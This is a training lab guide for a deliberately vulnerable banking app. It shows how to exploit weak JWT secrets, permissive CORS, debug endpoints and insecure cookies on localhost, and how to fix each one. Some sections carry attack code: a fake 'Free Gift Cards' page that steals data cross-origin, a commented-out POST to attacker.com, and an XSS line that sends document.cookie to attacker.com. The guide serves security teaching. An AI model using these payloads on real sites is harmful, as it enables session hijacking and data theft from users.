# Security Misconfiguration

Security misconfiguration occurs when security settings are defined, implemented, or maintained improperly. This includes weak secret keys, permissive CORS policies, missing security headers, debug mode in production, and insecure session management.

## Prerequisites

- Browser access to functioning web app
- One registered user account
- Access to browser developer tools (Network and Console tabs)

## Configuration

Set the following in your `.env` file:

```
SECURITY_HARDENING_ENABLED=false  # Vulnerable state
FLASK_SECRET_KEY=secret123        # Weak secret key
JWT_SECRET_KEY=secret123          # Weak JWT secret
```

## Demonstrations

### Weak Secret Keys

Allows attackers to forge session tokens and JWT tokens using easily guessable secrets.

#### Exploit

##### Method 1: JWT Token Forgery via jwt.io

1. Log in to your account
2. Open browser developer tools (F12)
3. Go to Application tab → Storage → Local Storage → `http://localhost:5000`
4. Locate and copy the entire `jwt_token` value (long string starting with `eyJ...`)
5. Open https://jwt.io in a new tab
6. Paste your token into the "Encoded" section
7. In the "Verify Signature" section at the bottom, enter:
   ```
   secret123
   ```
8. Observe the "Signature Verified" message appears

**Expected Result (Vulnerable):** JWT signature verifies successfully with the weak secret `secret123`. An attacker can now:
- Modify the payload (e.g., change `user_id`, `is_admin`)
- Generate a new valid signature using `secret123`
- Forge tokens to impersonate any user

##### Method 2: Token Forgery via Browser Console

1. Open browser console (F12 → Console)
2. Execute the following to decode your current token:
   ```javascript
   const token = localStorage.getItem('jwt_token');
   const payload = JSON.parse(atob(token.split('.')[1]));
   console.log('Current token payload:', payload);
   ```
3. Note the `user_id` and `is_admin` values
4. An attacker with knowledge of the weak secret (`secret123`) can forge tokens using libraries like PyJWT or online tools

#### Mitigate

1. Generate strong random secrets using Python:
   ```bash
   python -c "import secrets; print(secrets.token_urlsafe(32))"
   ```
   Run this command twice to generate two different secrets
2. Update `.env` file with the generated secrets:
   ```
   SECURITY_HARDENING_ENABLED=true
   FLASK_SECRET_KEY=your-generated-secret-key-here-32-chars-minimum
   JWT_SECRET_KEY=your-other-generated-secret-key-here-32-chars-minimum
   ```
3. Restart the application:
   - Docker: `docker-compose down && docker-compose up`
   - Local: Stop server (Ctrl+C) and run `python app.py`
4. Log in again (old tokens are now invalid)
5. Copy your new JWT token and try to verify it on jwt.io using `secret123`

**Expected Result (Protected):** JWT signature verification fails with `secret123`. The token can only be verified with the strong random secret, which attackers cannot guess.

### Missing Security Headers

Exposes application to clickjacking, MIME-type sniffing, and other attacks.

#### Exploit

1. Log in to your account
2. Open browser developer tools (F12)
3. Go to Network tab
4. Refresh the page
5. Click on any request to the application
6. Go to Headers tab and check Response Headers
7. Observe missing security headers:
   - No `X-Content-Type-Options`
   - No `X-Frame-Options`
   - No `X-XSS-Protection`
   - No `Strict-Transport-Security`

**Expected Result (Vulnerable):** Security headers are absent from responses.

#### Mitigate

1. Update `.env` file:
   ```
   SECURITY_HARDENING_ENABLED=true
   ```
2. Restart the application
3. Open DevTools (F12) → Network tab
4. Refresh the page or navigate to the dashboard
5. Click on the main document request (usually the first one, named `localhost` or `dashboard`)
6. Go to the Headers tab → Response Headers section
7. Look for the security headers

**Alternative: Check via Browser Console**
```javascript
fetch(window.location.href)
    .then(response => {
        console.log('Security Headers:');
        console.log('X-Content-Type-Options:', response.headers.get('X-Content-Type-Options'));
        console.log('X-Frame-Options:', response.headers.get('X-Frame-Options'));
        console.log('X-XSS-Protection:', response.headers.get('X-XSS-Protection'));
        console.log('Strict-Transport-Security:', response.headers.get('Strict-Transport-Security'));
    });
```

**Expected Result (Protected):** Response includes security headers:
- `X-Content-Type-Options: nosniff` - Prevents MIME-type sniffing
- `X-Frame-Options: DENY` - Prevents clickjacking
- `X-XSS-Protection: 1; mode=block` - Enables browser XSS filter
- `Strict-Transport-Security: max-age=31536000; includeSubDomains` - Forces HTTPS

### Permissive CORS Policy

Allows any origin to make cross-origin requests, exposing sensitive data.

#### Exploit

##### Method 1: Malicious HTML Page Attack

1. Ensure you are logged into Vulnerable Bank (http://localhost:5000) in your browser
2. Create a file named `attack.html` anywhere on your computer with the following content:
   ```html
   <!DOCTYPE html>
   <html>
   <head>
       <title>Innocent Looking Page</title>
   </head>
   <body>
       <h1>Free Gift Cards!</h1>
       <p>Loading your reward...</p>
       <script>
       // Attacker's malicious script
       fetch('http://localhost:5000/api/security-config', {
           credentials: 'include'
       })
       .then(r => r.json())
       .then(data => {
           console.log('Stolen security config:', data);
           // In real attack, this would send to attacker's server:
           // fetch('https://attacker.com/collect', {
           //     method: 'POST',
           //     body: JSON.stringify(data)
           // });
       });

       // Also steal user balance
       fetch('http://localhost:5000/check_balance/ACC1001', {
           credentials: 'include',
           headers: { 'Authorization': 'Bearer ' + document.cookie }
       })
       .then(r => r.json())
       .then(data => console.log('Stolen balance:', data));
       </script>
   </body>
   </html>
   ```
3. Open `attack.html` by double-clicking it (opens as `file:///...` origin)
4. Open browser console (F12 → Console)
5. Observe stolen data from the bank application appearing in console

**Expected Result (Vulnerable):** CORS allows requests from `file://` origin. Console displays:
- Stolen security config showing all vulnerability states
- User balance information
- Attacker successfully exfiltrated data from different origin

##### Method 2: Via Browser Console (Quick Test)

1. Log into Vulnerable Bank at http://localhost:5000
2. Open a completely different website (e.g., google.com) in a new tab
3. Open browser console on that tab
4. Execute:
   ```javascript
   fetch('http://localhost:5000/api/security-config')
       .then(r => r.json())
       .then(data => console.log('Cross-origin data stolen:', data))
       .catch(e => console.log('Blocked by CORS:', e));
   ```

**Expected Result (Vulnerable):** Request succeeds and returns data despite originating from a different domain.

#### Mitigate

1. Update `.env` file:
   ```
   SECURITY_HARDENING_ENABLED=true
   ALLOWED_CORS_ORIGINS=http://localhost:5000,http://127.0.0.1:5000
   ```
   Note: Only specify the exact origins that should have access
2. Restart the application:
   - Docker: `docker-compose down && docker-compose up`
   - Local: Stop and run `python app.py`
3. Try opening `attack.html` again (from Method 1 above)
4. Check browser console
5. Also test from a different website's console

**Expected Result (Protected):**
- Browser console shows CORS error: `Access to fetch at 'http://localhost:5000/api/security-config' from origin 'file://' has been blocked by CORS policy`
- The response is blocked before reaching JavaScript
- Only requests from `http://localhost:5000` are allowed

### Debug Mode in Production

Exposes detailed error messages and debug endpoints with sensitive information.

#### Exploit

##### Method 1: Accessing Debug Endpoint

1. Log in to your account at http://localhost:5000
2. In your browser address bar, navigate to:
   ```
   http://localhost:5000/debug
   ```
3. Observe exposed debug information including:
   - Environment variables (may include database credentials, API keys)
   - Python version and system information
   - Application configuration
   - Loaded modules and dependencies

**Expected Result (Vulnerable):** Debug endpoint returns sensitive system information in JSON format.

##### Method 2: Triggering Detailed Error Messages

1. Open browser console (F12 → Console)
2. Execute an intentionally malformed API request:
   ```javascript
   fetch('/api/virtual-cards/99999/transactions', {
       headers: { 'Authorization': 'Bearer ' + localStorage.getItem('jwt_token') }
   })
   .then(r => r.text())
   .then(data => console.log('Error response:', data));
   ```
3. Observe the detailed error response includes:
   - Full Python stacktrace
   - Absolute file paths on the server
   - Database query details
   - Internal variable names and values

**Expected Result (Vulnerable):** Error responses contain full stacktraces revealing internal application structure, making it easier for attackers to identify vulnerabilities.

#### Mitigate

1. Update `.env` file:
   ```
   SECURITY_HARDENING_ENABLED=true
   ```
2. Restart the application
3. Try accessing the debug endpoint:
   ```
   http://localhost:5000/debug
   ```
4. Execute the same malformed API request in browser console:
   ```javascript
   fetch('/api/virtual-cards/99999/transactions', {
       headers: { 'Authorization': 'Bearer ' + localStorage.getItem('jwt_token') }
   })
   .then(r => r.json())
   .then(data => console.log('Error response:', data));
   ```

**Expected Result (Protected):**
- Debug endpoint returns 404 Not Found or access denied
- Error responses contain generic messages like `{"status": "error", "message": "An error occurred"}` without revealing:
  - Stacktraces
  - File paths
  - Database details
  - Internal variable names

### Insecure Cookie Configuration

Session cookies lack security flags, exposing them to interception and XSS attacks.

#### Exploit

##### Method 1: Inspecting Cookie Security via DevTools

1. Log in to your account at http://localhost:5000
2. Open browser developer tools (F12)
3. Go to Application tab → Storage → Cookies → `http://localhost:5000`
4. Locate the `token` cookie in the list
5. Examine the cookie properties columns:
   - **Secure**: Should show ✗ (checkmark missing - allows HTTP transmission)
   - **HttpOnly**: Should show ✗ (allows JavaScript access)
   - **SameSite**: Shows "None" or blank (vulnerable to CSRF)
6. Note the cookie value (your session token)

**Expected Result (Vulnerable):** Cookie lacks all three critical security flags, making it vulnerable to:
- Interception over unencrypted connections
- Theft via XSS attacks
- CSRF attacks from malicious sites

##### Method 2: Accessing Cookie via JavaScript (Demonstrates HttpOnly Risk)

1. Remain logged in
2. Open browser console (F12 → Console)
3. Execute:
   ```javascript
   // This should work if HttpOnly is disabled
   console.log('All cookies:', document.cookie);

   // Extract just the token
   const cookies = document.cookie.split('; ');
   const tokenCookie = cookies.find(c => c.startsWith('token='));
   if (tokenCookie) {
       console.log('Session token accessible via JS:', tokenCookie);
       console.log('This token can be stolen by XSS attacks!');
   }
   ```

**Expected Result (Vulnerable):** Console displays the session token. An XSS attack could execute similar code to steal the token:
```javascript
// Malicious XSS payload that would exfiltrate the cookie
fetch('https://attacker.com/steal?cookie=' + document.cookie);
```

##### Method 3: Demonstrating Missing Secure Flag

1. Note that the application is running on `http://localhost:5000` (not HTTPS)
2. The session cookie is transmitted in clear text over HTTP
3. Execute in console to see request headers:
   ```javascript
   fetch('/api/security-config', {
       credentials: 'include'
   })
   .then(r => {
       console.log('Cookie sent over HTTP - visible to network sniffers');
       return r.json();
   });
   ```

**Expected Result (Vulnerable):** Cookie transmitted without encryption. Network sniffers (like Wireshark) can capture the session token in plaintext.

#### Mitigate

1. Update `.env` file:
   ```
   SECURITY_HARDENING_ENABLED=true
   ```
2. Restart the application
3. Log out and log in again (to get a new secure cookie)
4. Open DevTools → Application → Cookies
5. Examine the `token` cookie properties
6. Try accessing the cookie via JavaScript:
   ```javascript
   console.log('Trying to access cookie:', document.cookie);
   // Should no longer show the token cookie
   ```

**Expected Result (Protected):**
- **DevTools shows secure flags:**
  - `Secure`: ✓ (or marked as HTTPS-only)
  - `HttpOnly`: ✓ (JavaScript cannot access)
  - `SameSite`: `Strict` (CSRF protection)
- **Console shows:** The `token` cookie is missing from `document.cookie` output (blocked by HttpOnly)
- **Cookie cannot be stolen** via XSS attacks anymore
- **CSRF attacks prevented** by SameSite=Strict

## Technical Details

**Vulnerable Configuration:**
- Weak secret keys (`secret123`)
- No security headers
- Permissive CORS (`*` or broad origins)
- Debug mode enabled in production
- Insecure cookie flags

**Hardened Configuration:**
- Strong random secret keys (32+ characters)
- Comprehensive security headers
- Restricted CORS to specific origins
- Debug mode disabled
- Secure cookie configuration

Affected files:
- `app.py`: Security configuration and header management
- `.env.example`: Environment variable documentation
